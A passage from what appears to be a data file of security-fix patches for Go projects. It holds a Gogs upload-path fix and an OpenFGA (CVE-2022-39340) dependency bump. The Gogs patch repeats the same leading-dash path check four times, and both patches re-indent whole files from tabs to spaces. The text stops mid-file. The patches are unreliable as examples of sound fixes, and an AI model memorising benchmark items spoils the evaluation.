{\n-\t\t\treturn fmt.Errorf(\"remove upload: %v\", err)\n-\t\t}\n-\t}\n-\n-\treturn sess.Commit()\n+        if len(uploads) == 0 {\n+                return nil\n+        }\n+\n+        sess := x.NewSession()\n+        defer sess.Close()\n+        if err = sess.Begin(); err != nil {\n+                return err\n+        }\n+\n+        ids := make([]int64, len(uploads))\n+        for i := 0; i < len(uploads); i++ {\n+                ids[i] = uploads[i].ID\n+        }\n+        if _, err = sess.In(\"id\", ids).Delete(new(Upload)); err != nil {\n+                return fmt.Errorf(\"delete uploads: %v\", err)\n+        }\n+\n+        for _, upload := range uploads {\n+                localPath := upload.LocalPath()\n+                if !osutil.IsFile(localPath) {\n+                        continue\n+                }\n+\n+                if err := os.Remove(localPath); err != nil {\n+                        return fmt.Errorf(\"remove upload: %v\", err)\n+                }\n+        }\n+\n+        return sess.Commit()\n }\n \n func DeleteUpload(u *Upload) error {\n-\treturn DeleteUploads(u)\n+        return DeleteUploads(u)\n }\n \n func DeleteUploadByUUID(uuid string) error {\n-\tupload, err := GetUploadByUUID(uuid)\n-\tif err != nil {\n-\t\tif IsErrUploadNotExist(err) {\n-\t\t\treturn nil\n-\t\t}\n-\t\treturn fmt.Errorf(\"get upload by UUID[%s]: %v\", uuid, err)\n-\t}\n-\n-\tif err := DeleteUpload(upload); err != nil {\n-\t\treturn fmt.Errorf(\"delete upload: %v\", err)\n-\t}\n-\n-\treturn nil\n+        upload, err := GetUploadByUUID(uuid)\n+        if err != nil {\n+                if IsErrUploadNotExist(err) {\n+                        return nil\n+                }\n+                return fmt.Errorf(\"get upload by UUID[%s]: %v\", uuid, err)\n+        }\n+\n+        if err := DeleteUpload(upload); err != nil {\n+                return fmt.Errorf(\"delete upload: %v\", err)\n+        }\n+\n+        return nil\n }\n \n type UploadRepoFileOptions struct {\n-\tLastCommitID string\n-\tOldBranch    string\n-\tNewBranch    string\n-\tTreePath     string\n-\tMessage      string\n-\tFiles        []string // In UUID format\n+        LastCommitID string\n+        OldBranch    string\n+        NewBranch    string\n+        TreePath     string\n+        Message      string\n+        Files        []string // In UUID format\n }\n \n // isRepositoryGitPath returns true if given path is or resides inside \".git\"\n // path of the repository.\n func isRepositoryGitPath(path string) bool {\n-\treturn strings.HasSuffix(path, \".git\") ||\n-\t\tstrings.Contains(path, \".git/\") ||\n-\t\tstrings.Contains(path, `.git\\`) ||\n-\t\t// Windows treats \".git.\" the same as \".git\"\n-\t\tstrings.HasSuffix(path, \".git.\") ||\n-\t\tstrings.Contains(path, \".git./\") ||\n-\t\tstrings.Contains(path, `.git.\\`)\n+if strings.HasPrefix(path, \"-\") {\n+return true\n+}\n+    if strings.HasPrefix(path, \"-\") {\n+        return true\n+    }\n+if strings.HasPrefix(path, \"-\") {\n+return true\n+}\n+    if strings.HasPrefix(path, \"-\") {\n+        return true\n+    }\n+        return strings.HasSuffix(path, \".git\") ||\n+                strings.Contains(path, \".git/\") ||\n+                strings.Contains(path, `.git\\`) ||\n+                // Windows treats \".git.\" the same as \".git\"\n+                strings.HasSuffix(path, \".git.\") ||\n+                strings.Contains(path, \".git./\") ||\n+                strings.Contains(path, `.git.\\`)\n }\n \n func (repo *Repository) UploadRepoFiles(doer *User, opts UploadRepoFileOptions) error {\n-\tif len(opts.Files) == 0 {\n-\t\treturn nil\n-\t}\n-\n-\t// \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n-\tif isRepositoryGitPath(opts.TreePath) {\n-\t\treturn errors.Errorf(\"bad tree path %q\", opts.TreePath)\n-\t}\n-\n-\tuploads, err := GetUploadsByUUIDs(opts.Files)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"get uploads by UUIDs[%v]: %v\", opts.Files, err)\n-\t}\n-\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n-\t}\n-\n-\tif opts.OldBranch != opts.NewBranch {\n-\t\tif err = repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n-\t\t\treturn fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n-\t\t}\n-\t}\n-\n-\tlocalPath := repo.LocalCopyPath()\n-\tdirPath := path.Join(localPath, opts.TreePath)\n-\tif err = os.MkdirAll(dirPath, os.ModePerm); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Copy uploaded files into repository\n-\tfor _, upload := range uploads {\n-\t\ttmpPath := upload.LocalPath()\n-\t\tif !osutil.IsFile(tmpPath) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tupload.Name = pathutil.Clean(upload.Name)\n-\n-\t\t// \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n-\t\tif isRepositoryGitPath(upload.Name) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\ttargetPath := path.Join(dirPath, upload.Name)\n-\t\tif err = com.Copy(tmpPath, targetPath); err != nil {\n-\t\t\treturn fmt.Errorf(\"copy: %v\", err)\n-\t\t}\n-\t}\n-\n-\tif err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n-\t\treturn fmt.Errorf(\"git add --all: %v\", err)\n-\t}\n-\n-\terr = git.CreateCommit(\n-\t\tlocalPath,\n-\t\t&git.Signature{\n-\t\t\tName:  doer.DisplayName(),\n-\t\t\tEmail: doer.Email,\n-\t\t\tWhen:  time.Now(),\n-\t\t},\n-\t\topts.Message,\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n-\t}\n-\n-\terr = git.Push(localPath, \"origin\", opts.NewBranch,\n-\t\tgit.PushOptions{\n-\t\t\tCommandOptions: git.CommandOptions{\n-\t\t\t\tEnvs: ComposeHookEnvs(ComposeHookEnvsOptions{\n-\t\t\t\t\tAuthUser:  doer,\n-\t\t\t\t\tOwnerName: repo.MustOwner().Name,\n-\t\t\t\t\tOwnerSalt: repo.MustOwner().Salt,\n-\t\t\t\t\tRepoID:    repo.ID,\n-\t\t\t\t\tRepoName:  repo.Name,\n-\t\t\t\t\tRepoPath:  repo.RepoPath(),\n-\t\t\t\t}),\n-\t\t\t},\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n-\t}\n-\n-\treturn DeleteUploads(uploads...)\n+        if len(opts.Files) == 0 {\n+                return nil\n+        }\n+\n+        // \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n+        if isRepositoryGitPath(opts.TreePath) {\n+                return errors.Errorf(\"bad tree path %q\", opts.TreePath)\n+        }\n+\n+        uploads, err := GetUploadsByUUIDs(opts.Files)\n+        if err != nil {\n+                return fmt.Errorf(\"get uploads by UUIDs[%v]: %v\", opts.Files, err)\n+        }\n+\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n+        }\n+\n+        if opts.OldBranch != opts.NewBranch {\n+                if err = repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n+                        return fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n+                }\n+        }\n+\n+        localPath := repo.LocalCopyPath()\n+        dirPath := path.Join(localPath, opts.TreePath)\n+        if err = os.MkdirAll(dirPath, os.ModePerm); err != nil {\n+                return err\n+        }\n+\n+        // Copy uploaded files into repository\n+        for _, upload := range uploads {\n+                tmpPath := upload.LocalPath()\n+                if !osutil.IsFile(tmpPath) {\n+                        continue\n+                }\n+\n+                upload.Name = pathutil.Clean(upload.Name)\n+\n+                // \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n+                if isRepositoryGitPath(upload.Name) {\n+                        continue\n+                }\n+\n+                targetPath := path.Join(dirPath, upload.Name)\n+                if err = com.Copy(tmpPath, targetPath); err != nil {\n+                        return fmt.Errorf(\"copy: %v\", err)\n+                }\n+        }\n+\n+        if err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n+                return fmt.Errorf(\"git add --all: %v\", err)\n+        }\n+\n+        err = git.CreateCommit(\n+                localPath,\n+                &git.Signature{\n+                        Name:  doer.DisplayName(),\n+                        Email: doer.Email,\n+                        When:  time.Now(),\n+                },\n+                opts.Message,\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n+        }\n+\n+        err = git.Push(localPath, \"origin\", opts.NewBranch,\n+                git.PushOptions{\n+                        CommandOptions: git.CommandOptions{\n+                                Envs: ComposeHookEnvs(ComposeHookEnvsOptions{\n+                                        AuthUser:  doer,\n+                                        OwnerName: repo.MustOwner().Name,\n+                                        OwnerSalt: repo.MustOwner().Salt,\n+                                        RepoID:    repo.ID,\n+                                        RepoName:  repo.Name,\n+                                        RepoPath:  repo.RepoPath(),\n+                                }),\n+                        },\n+                },\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n+        }\n+\n+        return DeleteUploads(uploads...)\n }\n"}
{"cve":"CVE-2022-39340:0708", "fix_patch": "diff --git a/go.mod b/go.mod\nindex ffad779d..669f3cb1 100644\n--- a/go.mod\n+++ b/go.mod\n@@ -3,88 +3,88 @@ module github.com/openfga/openfga\n go 1.18\n \n require (\n-\tgithub.com/Masterminds/squirrel v1.5.3\n-\tgithub.com/MicahParks/keyfunc v1.5.1\n-\tgithub.com/cenkalti/backoff/v4 v4.1.3\n-\tgithub.com/docker/docker v20.10.19+incompatible\n-\tgithub.com/docker/go-connections v0.4.0\n-\tgithub.com/go-errors/errors v1.4.2\n-\tgithub.com/go-sql-driver/mysql v1.6.0\n-\tgithub.com/golang-jwt/jwt/v4 v4.4.2\n-\tgithub.com/golang/mock v1.6.0\n-\tgithub.com/google/go-cmp v0.5.9\n-\tgithub.com/grpc-ecosystem/go-grpc-middleware v1.3.0\n-\tgithub.com/grpc-ecosystem/grpc-gateway/v2 v2.12.0\n-\tgithub.com/hashicorp/go-retryablehttp v0.7.1\n-\tgithub.com/jackc/pgx/v5 v5.0.3\n-\tgithub.com/karlseguin/ccache/v2 v2.0.8\n-\tgithub.com/oklog/ulid/v2 v2.1.0\n-\tgithub.com/pkg/errors v0.9.1\n-\tgithub.com/pressly/goose/v3 v3.6.2-0.20220713121812-0a7297073735\n-\tgithub.com/rs/cors v1.8.2\n-\tgithub.com/spf13/cobra v1.6.0\n-\tgithub.com/spf13/pflag v1.0.5\n-\tgithub.com/spf13/viper v1.13.0\n-\tgithub.com/stretchr/testify v1.8.0\n-\tgithub.com/tidwall/gjson v1.14.3\n-\tgo.buf.build/openfga/go/openfga/api v1.2.35\n-\tgo.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc v0.36.3\n-\tgo.opentelemetry.io/otel v1.11.0\n-\tgo.opentelemetry.io/otel/metric v0.32.3\n-\tgo.opentelemetry.io/otel/trace v1.11.0\n-\tgo.uber.org/zap v1.23.0\n-\tgolang.org/x/sync v0.0.0-20220601150217-0de741cfad7f\n-\tgoogle.golang.org/grpc v1.50.1\n-\tgoogle.golang.org/protobuf v1.28.1\n+        github.com/Masterminds/squirrel v1.5.3\n+        github.com/MicahParks/keyfunc v1.5.1\n+        github.com/cenkalti/backoff/v4 v4.1.3\n+        github.com/docker/docker v20.10.19+incompatible\n+        github.com/docker/go-connections v0.4.0\n+        github.com/go-errors/errors v1.4.2\n+        github.com/go-sql-driver/mysql v1.6.0\n+        github.com/golang-jwt/jwt/v4 v4.4.2\n+        github.com/golang/mock v1.6.0\n+        github.com/google/go-cmp v0.5.9\n+        github.com/grpc-ecosystem/go-grpc-middleware v1.4.0\n+        github.com/grpc-ecosystem/grpc-gateway/v2 v2.12.0\n+        github.com/hashicorp/go-retryablehttp v0.7.1\n+        github.com/jackc/pgx/v5 v5.0.3\n+        github.com/karlseguin/ccache/v2 v2.0.8\n+        github.com/oklog/ulid/v2 v2.1.0\n+        github.com/pkg/errors v0.9.1\n+        github.com/pressly/goose/v3 v3.6.2-0.20220713121812-0a7297073735\n+        github.com/rs/cors v1.8.2\n+        github.com/spf13/cobra v1.6.0\n+        github.com/spf13/pflag v1.0.5\n+        github.com/spf13/viper v1.13.0\n+        github.com/stretchr/testify v1.8.0\n+        github.com/tidwall/gjson v1.14.3\n+        go.buf.build/openfga/go/openfga/api v1.2.35\n+        go.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc v0.36.3\n+        go.opentelemetry.io/otel v1.11.0\n+        go.opentelemetry.io/otel/metric v0.32.3\n+        go.opentelemetry.io/otel/trace v1.11.0\n+        go.uber.org/zap v1.23.0\n+        golang.org/x/sync v0.0.0-20220601150217-0de741cfad7f\n+        google.golang.org/grpc v1.50.1\n+        google.golang.org/protobuf v1.28.1\n )\n \n require (\n-\tgithub.com/Microsoft/go-winio v0.5.2 // indirect\n-\tgithub.com/davecgh/go-spew v1.1.1 // indirect\n-\tgithub.com/docker/distribution v2.8.1+incompatible // indirect\n-\tgithub.com/docker/go-units v0.4.0 // indirect\n-\tgithub.com/fsnotify/fsnotify v1.5.4 // indirect\n-\tgithub.com/go-logr/logr v1.2.3 // indirect\n-\tgithub.com/go-logr/stdr v1.2.2 // indirect\n-\tgithub.com/gogo/protobuf v1.3.2 // indirect\n-\tgithub.com/golang/protobuf v1.5.2 // indirect\n-\tgithub.com/hashicorp/go-cleanhttp v0.5.2 // indirect\n-\tgithub.com/hashicorp/hcl v1.0.0 // indirect\n-\tgithub.com/inconshreveable/mousetrap v1.0.1 // indirect\n-\tgithub.com/jackc/pgpassfile v1.0.0 // indirect\n-\tgithub.com/jackc/pgservicefile v0.0.0-20200714003250-2b9c44734f2b // indirect\n-\tgithub.com/jackc/puddle/v2 v2.0.0 // indirect\n-\tgithub.com/lann/builder v0.0.0-20180802200727-47ae307949d0 // indirect\n-\tgithub.com/lann/ps v0.0.0-20150810152359-62de8c46ede0 // indirect\n-\tgithub.com/magiconair/properties v1.8.6 // indirect\n-\tgithub.com/mitchellh/mapstructure v1.5.0 // indirect\n-\tgithub.com/moby/term v0.0.0-20210619224110-3f7ff695adc6 // indirect\n-\tgithub.com/morikuni/aec v1.0.0 // indirect\n-\tgithub.com/opencontainers/go-digest v1.0.0 // indirect\n-\tgithub.com/opencontainers/image-spec v1.0.2 // indirect\n-\tgithub.com/pelletier/go-toml v1.9.5 // indirect\n-\tgithub.com/pelletier/go-toml/v2 v2.0.5 // indirect\n-\tgithub.com/pmezard/go-difflib v1.0.0 // indirect\n-\tgithub.com/sirupsen/logrus v1.8.1 // indirect\n-\tgithub.com/spf13/afero v1.8.2 // indirect\n-\tgithub.com/spf13/cast v1.5.0 // indirect\n-\tgithub.com/spf13/jwalterweatherman v1.1.0 // indirect\n-\tgithub.com/subosito/gotenv v1.4.1 // indirect\n-\tgithub.com/tidwall/match v1.1.1 // indirect\n-\tgithub.com/tidwall/pretty v1.2.0 // indirect\n-\tgo.buf.build/openfga/go/envoyproxy/protoc-gen-validate v1.2.7 // indirect\n-\tgo.buf.build/openfga/go/grpc-ecosystem/grpc-gateway v1.2.46 // indirect\n-\tgo.uber.org/atomic v1.7.0 // indirect\n-\tgo.uber.org/goleak v1.1.12 // indirect\n-\tgo.uber.org/multierr v1.6.0 // indirect\n-\tgolang.org/x/crypto v0.0.0-20220829220503-c86fa9a7ed90 // indirect\n-\tgolang.org/x/net v0.0.0-20220909164309-bea034e7d591 // indirect\n-\tgolang.org/x/sys v0.0.0-20220731174439-a90be440212d // indirect\n-\tgolang.org/x/text v0.3.8 // indirect\n-\tgolang.org/x/time v0.0.0-20220411224347-583f2d630306 // indirect\n-\tgoogle.golang.org/genproto v0.0.0-20221014213838-99cd37c6964a // indirect\n-\tgopkg.in/ini.v1 v1.67.0 // indirect\n-\tgopkg.in/yaml.v2 v2.4.0 // indirect\n-\tgopkg.in/yaml.v3 v3.0.1 // indirect\n-\tgotest.tools/v3 v3.2.0 // indirect\n+        github.com/Microsoft/go-winio v0.5.2 // indirect\n+        github.com/davecgh/go-spew v1.1.1 // indirect\n+        github.com/docker/distribution v2.8.1+incompatible // indirect\n+        github.com/docker/go-units v0.4.0 // indirect\n+        github.com/fsnotify/fsnotify v1.5.4 // indirect\n+        github.com/go-logr/logr v1.2.3 // indirect\n+        github.com/go-logr/stdr v1.2.2 // indirect\n+        github.com/gogo/protobuf v1.3.2 // indirect\n+        github.com/golang/protobuf v1.5.2 // indirect\n+        github.com/hashicorp/go-cleanhttp v0.5.2 // indirect\n+        github.com/hashicorp/hcl v1.0.0 // indirect\n+        github.com/inconshreveable/mousetrap v1.0.1 // indirect\n+        github.com/jackc/pgpassfile v1.0.0 // indirect\n+        github.com/jackc/pgservicefile v0.0.0-20200714003250-2b9c44734f2b // indirect\n+        github.com/jackc/puddle/v2 v2.0.0 // indirect\n+        github.com/lann/builder v0.0.0-20180802200727-47ae307949d0 // indirect\n+        github.com/lann/ps v0.0.0-20150810152359-62de8c46ede0 // indirect\n+        github.com/magiconair/properties v1.8.6 // indirect\n+        github.com/mitchellh/mapstructure v1.5.0 // indirect\n+        github.com/moby/term v0.0.0-20210619224110-3f7ff695adc6 // indirect\n+        github.com/morikuni/aec v1.0.0 // indirect\n+        github.com/opencontainers/go-digest v1.0.0 // indirect\n+        github.com/opencontainers/image-spec v1.0.2 // indirect\n+        github.com/pelletier/go-toml v1.9.5 // indirect\n+        github.com/pelletier/go-toml/v2 v2.0.5 // indirect\n+        github.com/pmezard/go-difflib v1.0.0 // indirect\n+        github.com/sirupsen/logrus v1.8.1 // indirect\n+        github.com/spf13/afero v1.8.2 // indirect\n+        github.com/spf13/cast v1.5.0 // indirect\n+        github.com/spf13/jwalterweatherman v1.1.0 // indirect\n+        github.com/subosito/gotenv v1.4.1 // indirect\n+        github.com/tidwall/match v1.1.1 // indirect\n+        github.com/tidwall/pretty v1.2.0 // indirect\n+        go.buf.build/openfga/go/envoyproxy/protoc-gen-validate v1.2.7 // indirect\n+        go.buf.build/openfga/go/grpc-ecosystem/grpc-gateway v1.2.46 // indirect\n+        go.uber.org/atomic v1.7.0 // indirect\n+        go.uber.org/goleak v1.1.12 // indirect\n+        go.uber.org/multierr v1.6.0 // indirect\n+        golang.org/x/crypto v0.0.0-20220829220503-c86fa9a7ed90 // indirect\n+        golang.org/x/net v0.0.0-20220909164309-bea034e7d591 // indirect\n+        golang.org/x/sys v0.0.0-20220731174439-a90be440212d // indirect\n+        golang.org/x/text v0.3.8 // indirect\n+        golang.org/x/time v0.0.0-20220411224347-583f2d630306 // indirect\n+        google.golang.org/genproto v0.0.0-20221014213838-99cd37c6964a // indirect\n+        gopkg.in/ini.v1 v1.67.0 // indirect\n+        gopkg.in/yaml.v2 v2.4.0 // indirect\n+        gopkg.in/yaml.v3 v3.0.1 // indirect\n+        gotest.tools/v3 v3.2.0 // indirect\n )\ndiff --git a/pkg/cmd/service/service.go b/pkg/cmd/service/service.go\nindex b99ad681..1f973dae 100644\n--- a/pkg/cmd/service/service.go\n+++ b/pkg/cmd/service/service.go\n@@ -1,219 +1,219 @@\n package service\n \n import (\n-\t\"context\"\n-\t\"fmt\"\n-\t\"net\"\n-\t\"net/netip\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/go-errors/errors\"\n-\tgrpc_auth \"github.com/grpc-ecosystem/go-grpc-middleware/auth\"\n-\t\"github.com/openfga/openfga/pkg/encoder\"\n-\t\"github.com/openfga/openfga/pkg/encrypter\"\n-\t\"github.com/openfga/openfga/pkg/logger\"\n-\t\"github.com/openfga/openfga/pkg/telemetry\"\n-\t\"github.com/openfga/openfga/server\"\n-\t\"github.com/openfga/openfga/server/authn\"\n-\t\"github.com/openfga/openfga/server/authn/oidc\"\n-\t\"github.com/openfga/openfga/server/authn/presharedkey\"\n-\t\"github.com/openfga/openfga/server/middleware\"\n-\t\"github.com/openfga/openfga/storage\"\n-\t\"github.com/openfga/openfga/storage/caching\"\n-\t\"github.com/openfga/openfga/storage/memory\"\n-\t\"github.com/openfga/openfga/storage/mysql\"\n-\t\"github.com/openfga/openfga/storage/postgres\"\n-\t\"github.com/spf13/viper\"\n-\t\"google.golang.org/grpc\"\n+        \"context\"\n+        \"fmt\"\n+        \"net\"\n+        \"net/netip\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/go-errors/errors\"\n+        grpc_auth \"github.com/grpc-ecosystem/go-grpc-middleware/auth\"\n+        \"github.com/openfga/openfga/pkg/encoder\"\n+        \"github.com/openfga/openfga/pkg/encrypter\"\n+        \"github.com/openfga/openfga/pkg/logger\"\n+        \"github.com/openfga/openfga/pkg/telemetry\"\n+        \"github.com/openfga/openfga/server\"\n+        \"github.com/openfga/openfga/server/authn\"\n+        \"github.com/openfga/openfga/server/authn/oidc\"\n+        \"github.com/openfga/openfga/server/authn/presharedkey\"\n+        \"github.com/openfga/openfga/server/middleware\"\n+        \"github.com/openfga/openfga/storage\"\n+        \"github.com/openfga/openfga/storage/caching\"\n+        \"github.com/openfga/openfga/storage/memory\"\n+        \"github.com/openfga/openfga/storage/mysql\"\n+        \"github.com/openfga/openfga/storage/postgres\"\n+        \"github.com/spf13/viper\"\n+        \"google.golang.org/grpc\"\n )\n \n var (\n-\tErrInvalidGRPCTLSConfig = errors.New(\"'grpc.tls.cert' and 'grpc.tls.key' configs must be set\")\n-\tErrInvalidHTTPTLSConfig = errors.New(\"'http.tls.cert' and 'http.tls.key' configs must be set\")\n+        ErrInvalidGRPCTLSConfig = errors.New(\"'grpc.tls.cert' and 'grpc.tls.key' configs must be set\")\n+        ErrInvalidHTTPTLSConfig = errors.New(\"'http.tls.cert' and 'http.tls.key' configs must be set\")\n )\n \n // DatastoreConfig defines OpenFGA server configurations for datastore specific settings.\n type DatastoreConfig struct {\n \n-\t// Engine is the datastore engine to use (e.g. 'memory', 'postgres', 'mysql')\n-\tEngine string\n-\tURI    string\n+        // Engine is the datastore engine to use (e.g. 'memory', 'postgres', 'mysql')\n+        Engine string\n+        URI    string\n \n-\t// MaxCacheSize is the maximum number of cache keys that the storage cache can store before evicting\n-\t// old keys. The storage cache is used to cache query results for various static resources\n-\t// such as type definitions.\n-\tMaxCacheSize int\n+        // MaxCacheSize is the maximum number of cache keys that the storage cache can store before evicting\n+        // old keys. The storage cache is used to cache query results for various static resources\n+        // such as type definitions.\n+        MaxCacheSize int\n }\n \n // GRPCConfig defines OpenFGA server configurations for grpc server specific settings.\n type GRPCConfig struct {\n-\tAddr string\n-\tTLS  TLSConfig\n+        Addr string\n+        TLS  TLSConfig\n }\n \n // HTTPConfig defines OpenFGA server configurations for HTTP server specific settings.\n type HTTPConfig struct {\n-\tEnabled bool\n-\tAddr    string\n-\tTLS     TLSConfig\n+        Enabled bool\n+        Addr    string\n+        TLS     TLSConfig\n \n-\t// UpstreamTimeout is the timeout duration for proxying HTTP requests upstream\n-\t// to the grpc endpoint.\n-\tUpstreamTimeout time.Duration\n+        // UpstreamTimeout is the timeout duration for proxying HTTP requests upstream\n+        // to the grpc endpoint.\n+        UpstreamTimeout time.Duration\n \n-\tCORSAllowedOrigins []string `default:\"*\" split_words:\"true\"`\n-\tCORSAllowedHeaders []string `default:\"*\" split_words:\"true\"`\n+        CORSAllowedOrigins []string `default:\"*\" split_words:\"true\"`\n+        CORSAllowedHeaders []string `default:\"*\" split_words:\"true\"`\n }\n \n // TLSConfig defines configuration specific to Transport Layer Security (TLS) settings.\n type TLSConfig struct {\n-\tEnabled  bool\n-\tCertPath string `mapstructure:\"cert\"`\n-\tKeyPath  string `mapstructure:\"key\"`\n+        Enabled  bool\n+        CertPath string `mapstructure:\"cert\"`\n+        KeyPath  string `mapstructure:\"key\"`\n }\n \n // AuthnConfig defines OpenFGA server configurations for authentication specific settings.\n type AuthnConfig struct {\n \n-\t// Method is the authentication method that should be enforced (e.g. 'none', 'preshared', 'oidc')\n-\tMethod                   string\n-\t*AuthnOIDCConfig         `mapstructure:\"oidc\"`\n-\t*AuthnPresharedKeyConfig `mapstructure:\"preshared\"`\n+        // Method is the authentication method that should be enforced (e.g. 'none', 'preshared', 'oidc')\n+        Method                   string\n+        *AuthnOIDCConfig         `mapstructure:\"oidc\"`\n+        *AuthnPresharedKeyConfig `mapstructure:\"preshared\"`\n }\n \n // AuthnOIDCConfig defines configurations for the 'oidc' method of authentication.\n type AuthnOIDCConfig struct {\n-\tIssuer   string\n-\tAudience string\n+        Issuer   string\n+        Audience string\n }\n \n // AuthnPresharedKeyConfig defines configurations for the 'preshared' method of authentication.\n type AuthnPresharedKeyConfig struct {\n \n-\t// Keys define the preshared keys to verify authn tokens against.\n-\tKeys []string\n+        // Keys define the preshared keys to verify authn tokens against.\n+        Keys []string\n }\n \n // LogConfig defines OpenFGA server configurations for log specific settings. For production we\n // recommend using the 'json' log format.\n type LogConfig struct {\n \n-\t// Format is the log format to use in the log output (e.g. 'text' or 'json')\n-\tFormat string\n+        // Format is the log format to use in the log output (e.g. 'text' or 'json')\n+        Format string\n }\n \n // PlaygroundConfig defines OpenFGA server configurations for the Playground specific settings.\n type PlaygroundConfig struct {\n-\tEnabled bool\n-\tPort    int\n+        Enabled bool\n+        Port    int\n }\n \n // ProfilerConfig defines server configurations specific to pprof profiling.\n type ProfilerConfig struct {\n-\tEnabled bool\n-\tAddr    string\n+        Enabled bool\n+        Addr    string\n }\n \n type Config struct {\n-\t// If you change any of these settings, please update the documentation at https://github.com/openfga/openfga.dev/blob/main/docs/content/intro/setup-openfga.mdx\n+        // If you change any of these settings, please update the documentation at https://github.com/openfga/openfga.dev/blob/main/docs/content/intro/setup-openfga.mdx\n \n-\t// ListObjectsDeadline defines the maximum amount of time to accumulate ListObjects results\n-\t// before the server will respond. This is to protect the server from misuse of the\n-\t// ListObjects endpoints.\n-\tListObjectsDeadline time.Duration\n+        // ListObjectsDeadline defines the maximum amount of time to accumulate ListObjects results\n+        // before the server will respond. This is to protect the server from misuse of the\n+        // ListObjects endpoints.\n+        ListObjectsDeadline time.Duration\n \n-\t// ListObjectsMaxResults defines the maximum number of ListObjects results to accumulate\n-\t// before the server will respond. This is to protect the server from misuse of the\n-\t// ListObjects endpoints.\n-\tListObjectsMaxResults uint32\n+        // ListObjectsMaxResults defines the maximum number of ListObjects results to accumulate\n+        // before the server will respond. This is to protect the server from misuse of the\n+        // ListObjects endpoints.\n+        ListObjectsMaxResults uint32\n \n-\t// MaxTuplesPerWrite defines the maximum number of tuples per Write endpoint.\n-\tMaxTuplesPerWrite int\n+        // MaxTuplesPerWrite defines the maximum number of tuples per Write endpoint.\n+        MaxTuplesPerWrite int\n \n-\t// MaxTypesPerAuthorizationModel defines the maximum number of type definitions per authorization model for the WriteAuthorizationModel endpoint.\n-\tMaxTypesPerAuthorizationModel int\n+        // MaxTypesPerAuthorizationModel defines the maximum number of type definitions per authorization model for the WriteAuthorizationModel endpoint.\n+        MaxTypesPerAuthorizationModel int\n \n-\t// ChangelogHorizonOffset is an offset in minutes from the current time. Changes that occur after this offset will not be included in the response of ReadChanges.\n-\tChangelogHorizonOffset int\n+        // ChangelogHorizonOffset is an offset in minutes from the current time. Changes that occur after this offset will not be included in the response of ReadChanges.\n+        ChangelogHorizonOffset int\n \n-\t// ResolveNodeLimit indicates how deeply nested an authorization model can be.\n-\tResolveNodeLimit uint32\n+        // ResolveNodeLimit indicates how deeply nested an authorization model can be.\n+        ResolveNodeLimit uint32\n \n-\tDatastore  DatastoreConfig\n-\tGRPC       GRPCConfig\n-\tHTTP       HTTPConfig\n-\tAuthn      AuthnConfig\n-\tLog        LogConfig\n-\tPlayground PlaygroundConfig\n-\tProfiler   ProfilerConfig\n+        Datastore  DatastoreConfig\n+        GRPC       GRPCConfig\n+        HTTP       HTTPConfig\n+        Authn      AuthnConfig\n+        Log        LogConfig\n+        Playground PlaygroundConfig\n+        Profiler   ProfilerConfig\n }\n \n func DefaultConfigWithRandomPorts() (*Config, error) {\n-\tconfig := DefaultConfig()\n-\n-\tl, err := net.Listen(\"tcp\", \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tdefer l.Close()\n-\thttpPort := l.Addr().(*net.TCPAddr).Port\n-\n-\tl, err = net.Listen(\"tcp\", \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tdefer l.Close()\n-\tgrpcPort := l.Addr().(*net.TCPAddr).Port\n-\n-\tconfig.GRPC.Addr = fmt.Sprintf(\"0.0.0.0:%d\", grpcPort)\n-\tconfig.HTTP.Addr = fmt.Sprintf(\"0.0.0.0:%d\", httpPort)\n-\n-\treturn config, nil\n+        config := DefaultConfig()\n+\n+        l, err := net.Listen(\"tcp\", \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+        defer l.Close()\n+        httpPort := l.Addr().(*net.TCPAddr).Port\n+\n+        l, err = net.Listen(\"tcp\", \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+        defer l.Close()\n+        grpcPort := 